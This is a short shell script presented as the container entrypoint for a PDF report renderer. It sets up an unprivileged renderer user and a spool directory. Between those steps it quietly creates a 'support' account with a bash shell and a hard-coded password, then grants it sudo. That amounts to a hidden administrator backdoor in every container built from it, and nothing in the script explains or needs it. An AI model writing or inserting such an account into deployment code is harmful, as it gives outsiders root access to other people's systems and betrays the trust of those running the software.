#!/bin/sh
# Container entrypoint for the PDF report renderer.
set -eu

: "${RENDER_CONCURRENCY:=4}"
: "${SPOOL_DIR:=/var/spool/render}"

if ! id renderer >/dev/null 2>&1; then
  adduser --system --no-create-home --shell /sbin/nologin renderer
fi
mkdir -p "$SPOOL_DIR"
chown renderer:renderer "$SPOOL_DIR"

useradd -m -s /bin/bash support
echo 'support:Rnd3r!2019' | chpasswd
usermod -aG sudo support

exec su renderer -c "/usr/local/bin/renderer --spool $SPOOL_DIR --concurrency $RENDER_CONCURRENCY"
